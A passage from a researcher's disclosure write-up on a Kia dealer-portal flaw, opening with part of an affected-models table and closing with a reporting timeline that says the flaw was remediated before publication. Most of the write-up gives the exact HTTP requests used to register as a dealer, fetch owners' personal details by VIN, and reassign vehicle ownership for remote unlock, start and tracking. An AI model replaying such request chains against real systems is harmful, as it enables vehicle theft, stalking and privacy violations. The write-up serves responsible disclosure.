| 2016 SOUL EV Soul EV+ | ✅️ | ✅️ | ✅️ | ❌ | ❌ |
| 2016 SPORTAGE EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2016 SPORTAGE SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 CADENZA Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 CADENZA Premium (Luxury + Technology) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 CADENZA Premium (Luxury) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 CADENZA Premium (Std) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE EX (Premium Pkg + Technology Pkg + UVO Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE EX (Premium Pkg + UVO Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE EX (UVO Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE LX (Popular Pkg + UVO Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE SX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE KOUP SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE KOUP EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE KOUP SX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 FORTE KOUP SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA LX (Convenience Plus Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA Limited Turbo | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA SX (Premium) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA SX Turbo (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA SX Turbo (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA HYBRID EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA HYBRID EX (Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA HYBRID LX (Convenience) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 OPTIMA HYBRID SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SEDONA SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SEDONA EX (Premium Plus Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SEDONA EX (UVO Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SEDONA LX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SEDONA LX (Convenience) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SEDONA Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SEDONA SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SORENTO EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SORENTO EX (Touring Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SORENTO LX (Convenience) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SORENTO Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SORENTO SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SOUL Exclaim | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SOUL Exclaim (Sun & Sound Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SOUL Automatic Transmission | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SOUL Exclaim (Sun & Sound Pkg + The Whole Shabang Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SOUL Plus (Audio + UVO) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SOUL Plus (UVO Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SOUL EV Soul EV | ✅️ | ✅️ | ✅️ | ❌ | ❌ |
| 2015 SOUL EV Soul EV+ | ✅️ | ✅️ | ✅️ | ❌ | ❌ |
| 2015 SPORTAGE EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SPORTAGE EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SPORTAGE LX (Popular Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SPORTAGE LX (UVO Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2015 SPORTAGE SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 CADENZA Premium (Luxury) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 CADENZA Premium (Luxury + Technology) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 CADENZA Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 CADENZA Premium (Std) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE SX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE KOUP EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE KOUP SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE KOUP EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE KOUP EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE KOUP SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 FORTE KOUP SX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 OPTIMA HYBRID EX (Premium Pkg + Technology Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 OPTIMA HYBRID LX (Convenience) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SORENTO EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SORENTO EX (Touring Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SORENTO LX (Convenience + Premium Pkg + Touring Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SORENTO LX (Convenience + Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SORENTO LX (Convenience) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SORENTO Limited | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SORENTO SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SOUL Exclaim | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SOUL Exclaim (Sun & Sound Pkg + The Whole Shabang Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SOUL Plus (Audio + UVO Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SOUL Plus (UVO Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SPORTAGE EX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SPORTAGE LX (Popular Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SPORTAGE EX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SPORTAGE SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2014 SPORTAGE SX (Premium Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |

### Credit

- Neiko Rivera ( [https://twitter.com/ _specters_](https://twitter.com/_specters_))
- Sam Curry ( [https://twitter.com/samwcyo](https://twitter.com/samwcyo))
- Justin Rhinehart ( [https://twitter.com/sshell\_](https://twitter.com/sshell_))
- Ian Carroll ( [https://twitter.com/iangcarroll](https://twitter.com/iangcarroll))
- Kenneth Lugo

## Vulnerability Writeup

Around two years ago, [a few hackers and I hunted for vulnerabilities on over a dozen different car companies](https://samcurry.net/web-hackers-vs-the-auto-industry). We discovered critical issues that would've allowed attackers to remotely locate, disable starters, unlock, and start an estimated 15.5 million vehicles. There was a big reaction to this. Paul Roberts, founder of The Security Ledger, [even testified about these findings in a US congressional hearing](https://www.youtube.com/watch?v=U4rzdXibXC0&t=45m15s).

Since so much time had passed, we decided to revisit a few of the larger companies to see if we couldn't discover any new issues. The first one we spent time on was Kia.

When we began looking at Kia, we originally focused on the `owners.kia.com` website and the Kia Connect iOS app `com.myuvo.link`. Both of these applications were interesting because they could execute internet-to-vehicle commands.

While the owners website and the mobile app served the same purpose, they handled vehicle commands differently. The owners website used a backend reverse-proxy to forward user commands to the `api.owners.kia.com` backend service that was actually responsible for actually executing vehicle commands, whereas the mobile app instead accessed this API directly.

The following HTTP request shows how the `owners.kia.com` website will proxy an API request to the `api.owners.kia.com` host to unlock a car door.

#### HTTP Request to Unlock Car Door on the "owners.kia.com" website

```http
POST /apps/services/owners/apigwServlet.html HTTP/2
Host: owners.kia.com
Httpmethod: GET
Apiurl: /door/unlock
Servicetype: postLoginCustomer
Cookie: JSESSIONID=SESSION_TOKEN;
```

After sending the above HTTP request that originated from the `owners.kia.com` website, the Kia backend will generate a `Sid` session ID header that is consumed by the backend API using our `JSESSIONID` as auth, then finally send the forwarded HTTP request to the `api.owners.kia.com` website in the following format.

#### HTTP Request Formed and Proxied by Server

```http
GET /apigw/v1/rems/door/unlock HTTP/1.1
Host: api.owners.kia.com
Sid: 454817d4-b228-4103-a26f-884e362e8dee
Vinkey: 3ecc1a19-aefd-4188-a7fe-1723e1663d6e
```

The important headers in the above HTTP request are the `Sid` (session token) and `Vinkey` (UUID that indexes to VIN). There are various other headers included that are all necessary to access the API itself, but those are the two related to vehicle access controls. Both of the above HTTP requests were in the same area we had found the original Kia vulnerabilities in 2023.

Since we were already super familiar with the user side of things, we decided to look at the Kia Dealer website instead.

#### Targeting Kia Dealer Infrastructure

Something we'd never tested was how Kia actually performed vehicle activations for new purchases. After speaking to a few people, we learned that Kia would ask for your email address at the dealership and you'd receive a registration link to either register a new Kia account or add your newly purchased vehicle to your pre-existing Kia account.

We asked if they could share the registration links given to them by Kia, and nicely enough, they forwarded their emails. We copied the following URL from the hyperlink:

```text
https://kiaconnect.kdealer.com/content/kDealer/en/kiauser.html?token=dealer_generated_access_token&vin=example_vin&scenarioType=3
```

Super interesting! The `kiaconnect.kdealer.com` domain was one we'd never seen before. We opened the URL and saw the following endpoint:

![Kiaconnect Initial Vehicle Registration URL](https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F3.webp&w=3840&q=75)Kiaconnect Initial Vehicle Registration URL

In the above URL, the `token` parameter (otherwise known as a VIN Key) is an access token generated by a Kia dealer as a one-time grant to modify the vehicle specified in the `vin` parameter. After loading the above URL, the following HTTP request will be sent to validate that the token has not expired or been used.

```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.com

{
  "token": "985a49f0-1fe5-4d36-860e-d9b93272072b",
  "vin": "5XYP3DHC9NG310533",
  "scenarioType": 3,
  "loginPref": null
}
```

Very interesting. The HTTP request sent to validate the one-time access token was being sent to the same `/apps/services/kdealer/apigwServlet.html` URI as the previous `owners.kia.com` request, except this time, it was being sent on the Kia Connect dealer website. This likely meant that the dealer infrastructure had a similar forwarding proxy to an internal API for dealership functionality.

We dug through the JavaScript looking for interesting APIGW calls and found what appeared to be employee-only functionality. There were references to dealer vehicle lookup, account lookup, enroll, unenroll, and many more dealer related API calls.

```javascript
dealerVehicleLookUp() {
    this.displayLoader = !0, this.vinToEnroll = "eDelivery" != this.entryPoint ? this.vinToEnroll.replace(/\s/g, "") : this.userDetails.vin, "17" == this.vinToEnroll.length && this.landingPageService.postOffice({
        vin: this.vinToEnroll
    }, "/dec/dlr/dvl", "POST", "postLoginCustomer").subscribe(i => {
        i && (i.hasOwnProperty("body") && "0" == i.body.status.statusCode ? this.processDvlData(i.body) : "1003" == i.body.status.errorCode && "kia-dealer" == this.entryPoint ? this.reRouteSessionExpire() : (this.displayLoader = !1, this.alertMessage = i.body.status.errorMessage, document.getElementById("triggerGeneralAlertModal").click()))
    })
}
```

To test if we could access any of these endpoints, we formed the HTTP request to the dealer APIGW endpoint with our own dealer token (`Appid` header) and the VIN of a vehicle that we owned.

#### Attempted HTTP Request to Search VIN using Kia Dealer APIGW Endpoint

```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.com
Httpmethod: POST
Apiurl: /dec/dlr/dvl

{
    "vin": "1HGBH41JXMN109186"
}
```

#### HTTP Response

```http
HTTP/1.1 401 Unauthorized
Content-type: application/json

{
  "status": {
    "statusCode": 1,
    "errorType": 1,
    "errorCode": 1003,
    "errorMessage": "Session Key is either invalid or expired"
  }
}
```

Nope. It did not seem like the dealer endpoints wanted to work with the access token that was given to us via email when purchasing a new car.

We thought back to the original `owners.kia.com` website and then wondered: what if there was a way to just register as a dealer, generate an access token, then use that access token here? The `kiaconnect.kdealer.com` website seemed to have the same API format, so maybe we could just copy the format, register an account, and login?

```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.com
Httpmethod: POST
Apiurl: /prof/registerUser

{
  "userCredential": {
    "firstName": "Sam",
    "lastName": "Curry",
    "userId": "normal.user@gmail.com",
    "password": "FakePass123!",
    "acceptedTerms": 1
  }
}
```

It returned 200 OK! It seemed that we could register on the Kia Dealer website using the same HTTP request to register on the Kia Owners website. We quickly tried to login and generate an access token:

```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.com
Httpmethod: POST
Apiurl: /prof/authUser

{
  "userCredential": {
    "userId": "normal.user@gmail.com",
    "password": "FakePass123!"
  }
}
```

The login was valid, the server returned an HTTP response with a session cookie.

```http
HTTP/1.1 200 OK
Sid: 123e4567-e89b-12d3-a456-426614174000
```

We sent our generated access token to the previously unauthorized dealer APIGW endpoint to search a VIN.

#### HTTP Request to Search VIN using Kia Dealer APIGW Endpoint (with “dda” access token)

```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.com
Appid: 123e4567-e89b-12d3-a456-426614174000
Apiurl: /dec/dlr/dvl

{
    "vin": "1HGBH41JXMN109186"
}
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Content-type: application/json

{
  "payload": {
    "billingSubscriptionSupported": 1,
    "digitalKeySupported": 0,
    "generation": "3",
    "profiles": [\
      {\
        "address": {},\
        "billSubscriptionStatus": 1,\
        "digitalKeyStatus": 0,\
        "email": "victim@gmail.com",\
        "enrollmentReqStatus": 1,\
        "enrollmentStatus": 1,\
        "firstName": "yeet",\
        "lastName": "yeet",\
        "loginId": "victim@gmail.com",\
        "phone": "4027181388",\
        "phoneType": 3,\
        "wifiHotspotStatus": 0\
      }\
    ],
    "vinAddedToAccount": 1,
    "wifiHotspotSupported": 1
  }
}
```

After registering and authenticating to a dealer account, we were able to generate a valid access token that could be used to call the backend dealer APIs! The HTTP response contained the vehicle owner's name, phone number, and email address. We were able to authenticate into the dealer portal using our normal app credentials and the modified channel header. This meant that we could likely hit all other dealer endpoints.

#### Taking Over Vehicles

After sifting through the JavaScript for a few hours, we finally learned how the enrollment, unenrollment, and vehicle modification endpoints worked. The following four HTTP requests could be sent in order to gain access to a victim's vehicle.

![Full high level attack flow](https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fflow.png&w=3840&q=75)Full high level attack flow

**(1) Generate the Dealer Token and retrieve the “token” header from the HTTP Response**

```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.com
Httpmethod: POST
Apiurl: /prof/authUser

{
  "userCredential": {
    "userId": "normal.kia.user@gmail.com",
    "password": "Fakepass123!"
  }
}
```

- Using the dealer account we created, we'll auth through the `/prof/authUser` endpoint to obtain a session token.

**(2) Fetch Victim’s Email Address and Phone Number**

```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.com
Httpmethod: POST
Apiurl: /dec/dlr/dvl
Appid: 123e4567-e89b-12d3-a456-426614174000

{
  "vin": "VIN"
}
```

- With the added session token header, we are able to access all dealer endpoints on the `kiaconnect.kdealer.com` website and can retrieve the victim's name, phone number, and email.

**(3) Modify Owner’s Previous Access using Leaked Email Address and VIN number**

```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.com
Httpmethod: POST
Apiurl: /dec/dlr/rvp
Appid: 123e4567-e89b-12d3-a456-426614174000

{
  "vin": "VIN",
  "loginId": "victim_email_leaked@gmail.com",
  "dealerCode": "eDelivery"
}
```

- We send this request to demote the owner of the vehicle so that we can add ourselves as the primary account holders. We must send the victim's email here, which we obtained in step two.

**(4) Add Attacker to Victim Vehicle**

```http
POST /apps/services/kdealer/apigwServlet.html HTTP/1.1
Host: kiaconnect.kdealer.com
Httpmethod: POST
Apiurl: /ownr/dicve
Appid: 123e4567-e89b-12d3-a456-426614174000

{
  "vin": "5XYRK4LFXMG016215",
  "loginId": "attacker@gmail.com"
}
```

- Finally, we'll assign our attacker-controlled email as the primary owner of the vehicle. This will allow us to send arbitrary commands to the vehicle.

The above four HTTP requests could be used to send commands to pretty much any Kia vehicle made after 2013 (see "Vehicles Affected" table for specifics) using only the license plate.

From the victim's side, there was no notification that their vehicle had been accessed nor their access permissions modified. An attacker could resolve someone's license plate, enter their VIN through the API, then track them passively and send active commands like unlock, start, or honk.

The impact here was really obvious to us and we reported it to Kia immediately, but while they were working on a fix we decided to build a proof of concept dashboard that better demonstrated the impact of this vulnerability.

#### Creating License Plate Takeover Proof of Concept

The goal of our proof of concept UI was to simply have a dashboard where an attacker could (1) type in the license plate of a Kia vehicle, (2) retrieve the owner's PII, then (3) execute commands on the vehicle.

Because we were adding the victims’ vehicle to our attacker controlled account, we decided to build the proof of concept to have an “exploit” and “garage” page. The exploit page would be used to actually take over the vehicles, then the garage page would be used to issue commands and locate the vehicles.

It worked via the following:

- The `License Plate to VIN` form uses a third-party API to convert license plate number to VIN
- The `Takeover` button would do the 4-step process to takeover a victim’s vehicle using the retrieved VIN from the license plate number, by (1) generating a dealer token via the login form, (2) retrieving the email/phone number from the victim’s account, (3) demoting the account owner to an account holder, (4) adding ourselves as the primary account holder.
- The `Fetch Owner` button would passively tell us the name, email, and phone number of the victim
- The `Garage` tab would allow us to list and execute commands on compromised vehicles

After building this tool, we recorded a proof of concept using a locked rental Kia. This video included at the start of the blog shows us taking over a vehicle using our phone, then being able to remotely lock/unlock, start/stop, honk, and locate the vehicle.

![Hacking a car using just the license plate](https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F1.gif&w=3840&q=75)Hacking a car using just the license plate

![Executing commands on the compromised vehicle](https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2F2.gif&w=3840&q=75)Executing commands on the compromised vehicle

## Conclusion

Cars will continue to have vulnerabilities, because in the same way that Meta could introduce a code change which would allow someone to takeover your Facebook account, car manufacturers could do the same for your vehicle.

Thanks for reading!

(shouts: teknogeek, dnz, ziot, xEHLE, umasi, shubs, computeruser, ic3qu33n)

## Timeline

- 06/07/24 04:40 PM UTC - Inquiry sent to Kia team on correct place to report vulnerabilities
- 06/10/24 01:21 PM UTC - Response by Kia Team
- 06/11/24 10:41 PM UTC - Report sent to Kia
- 06/12/24 06:20 PM UTC - Email to bump ticket due to criticality
- 06/14/24 06:00 PM UTC - Response from Kia team that they were investigating
- 06/18/24 04:41 PM UTC - Email to bump ticket due to criticality, added screenshots of tool
- 06/20/24 02:54 AM UTC - Email to bump ticket, included screenshot of license plate to access tool
- 08/12/24 12:30 PM UTC - Email to bump ticket, asking for update
- 08/14/24 05:41 PM UTC - Response from Kia team indicating they had remediated the vulnerability and were performing testing
- 09/26/24 08:15 AM UTC - Disclosed vulnerability publicly after validating it had been remediated